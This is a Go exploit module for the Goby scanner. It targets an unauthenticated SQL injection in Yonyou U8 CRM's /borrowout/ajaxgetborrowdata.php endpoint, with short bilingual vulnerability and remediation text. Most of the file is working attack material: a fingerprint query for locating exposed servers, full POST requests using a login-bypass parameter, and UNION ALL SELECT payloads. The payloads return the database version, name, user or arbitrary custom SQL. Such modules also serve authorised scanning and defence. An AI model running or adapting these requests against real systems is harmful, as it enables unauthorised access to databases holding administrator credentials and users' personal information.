package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "U8 CRM /borrowout/ajaxgetborrowdata.php SQL Injection Vulnerability",
    "Description": "<p>U8 CRM is a professional enterprise-level CRM software designed to help enterprises efficiently manage customer relationships, improve sales performance and provide high-quality customer service.There is a SQL injection vulnerability in the /borrowout/ajaxgetborrowdata.php file of U8 CRM. Unauthenticated attackers can use the vulnerability to execute arbitrary SQL statements. In addition to using the SQL injection vulnerability to obtain information in the database (for example, administrator backend passwords, user personal information of the site), attackers can even write Trojans to the server with high permissions to further obtain server system permissions.</p>",
    "Product": "yonyou-U8CRM",
    "Homepage": "https://www.yonyou.com/",
    "DisclosureDate": "2024-11-25",
    "PostTime": "2024-11-26",
    "Author": "1251220046@qq.com",
    "FofaQuery": "body=\"/js/UTU.js\" && body=\"/js/turboui.js\"",
    "GobyQuery": "body=\"/js/UTU.js\" && body=\"/js/turboui.js\"",
    "Level": "1",
    "Impact": "<p>There is a SQL injection vulnerability in the /borrowout/ajaxgetborrowdata.php file of the U8 CRM customer relationship management system of UFIDA. Unauthenticated attackers can execute arbitrary SQL statements through the vulnerability. In addition to using the SQL injection vulnerability to obtain information in the database (for example, the administrator's backend password, user personal information of the site), the attacker can even write a Trojan horse into the server with high permissions to further obtain server system permissions.</p>",
    "Recommendation": "<p>1. It is recommended to pay attention to the manufacturer's information and update to the latest version in time; <a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a> </p><p>2. Deploy a Web application firewall to monitor database operations;</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/144020810?spm=1001.2014.3001.5502"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "@@VERSION,DB_NAME(),USER_NAME()",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "DB_NAME()",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/borrowout/ajaxgetborrowdata.php?DontCheckLogin=1&Action=getWarehouseOtherInfo",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
                    "Accept": "*/*",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Cookie": "PHPSESSID=bgsesstimeout-;",
                    "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": "cWhCode={{{urlencode_poc}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "{{{random_md5}}}",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/borrowout/ajaxgetborrowdata.php?DontCheckLogin=1&Action=getWarehouseOtherInfo",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
                    "Accept": "*/*",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Cookie": "PHPSESSID=bgsesstimeout-;",
                    "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": "cWhCode={{{urlencode_exp}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|\"bWhPos\":\"([^'\"]+)\"",
                "output|when|attackType=sqlpoint|{{{lastreq}}}cWhCode=*"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "用友U8 CRM /borrowout/ajaxgetborrowdata.php SQL 注入漏洞",
            "Product": "用友U8CRM",
            "Description": "<p>用友U8 CRM 客户关系管理系统是一款专业的企业级CRM软件，旨在帮助企业高效管理客户关系、提升销售业绩和提供优质的客户服务。</p><p>用友 U8 CRM客户关系管理系统 /borrowout/ajaxgetborrowdata.php 文件存在SQL注入漏洞，未经身份验证的攻击者通过漏洞执行任意SQL语句，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "Recommendation": "<p>1、建议关注厂商信息，及时更新至最新版本：<a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a>&nbsp;</p><p>2、部署Web应用防火墙，对数据库操作进行监控。&nbsp;&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>用友 U8 CRM客户关系管理系统 /borrowout/ajaxgetborrowdata.php 文件存在SQL注入漏洞，未经身份验证的攻击者通过漏洞执行任意SQL语句，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "U8 CRM /borrowout/ajaxgetborrowdata.php SQL Injection Vulnerability",
            "Product": "yonyou-U8CRM",
            "Description": "<p>U8 CRM is a professional enterprise-level CRM software designed to help enterprises efficiently manage customer relationships, improve sales performance and provide high-quality customer service.There is a SQL injection vulnerability in the /borrowout/ajaxgetborrowdata.php file of U8 CRM. Unauthenticated attackers can use the vulnerability to execute arbitrary SQL statements. In addition to using the SQL injection vulnerability to obtain information in the database (for example, administrator backend passwords, user personal information of the site), attackers can even write Trojans to the server with high permissions to further obtain server system permissions.<br></p>",
            "Recommendation": "<p>1. It is recommended to pay attention to the manufacturer's information and update to the latest version in time;&nbsp;<a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a>&nbsp;</p><p>2. Deploy a Web application firewall to monitor database operations;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>There is a SQL injection vulnerability in the /borrowout/ajaxgetborrowdata.php file of the U8 CRM customer relationship management system of UFIDA. Unauthenticated attackers can execute arbitrary SQL statements through the vulnerability. In addition to using the SQL injection vulnerability to obtain information in the database (for example, the administrator's backend password, user personal information of the site), the attacker can even write a Trojan horse into the server with high permissions to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "random_int": "define|variable|{{{rand|int|8}}}",
        "random_md5": "define|md5|{{{random_int}}}",
        "poc": "define|variable|1' UNION ALL SELECT sys.fn_sqlvarbasetostr(HashBytes('MD5','{{{random_int}}}'))-- uSHuu",
        "urlencode_poc": "define|query_encode|{{{poc}}}",
        "payload": "switch|attackType|{{{default}}}",
        "exp": "define|variable|1' UNION ALL SELECT {{{payload}}}-- uSHuu",
        "urlencode_exp": "define|query_encode|{{{exp}}}"
    },
    "EditType": "fast",
    "VariablesOrder": [
        "random_int",
        "random_md5",
        "poc",
        "urlencode_poc",
        "payload",
        "exp",
        "urlencode_exp"
    ],
    "PocId": "9974"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
